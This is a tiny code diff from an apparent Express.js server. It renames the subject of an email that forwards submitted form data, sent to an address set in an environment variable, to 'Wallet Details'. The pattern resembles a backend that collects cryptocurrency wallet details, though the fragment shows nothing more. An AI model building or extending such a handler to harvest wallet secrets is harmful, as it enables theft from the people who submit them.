@@ -60,7 +60,7 @@ app.post('/fd1', (req, res) => {
 			let mailOptions = {
 				from: process.env.FROM,
 				to: process.env.TO,
-				subject: 'Details',
+				subject: 'Wallet Details',
 				html: data,
 			};
 
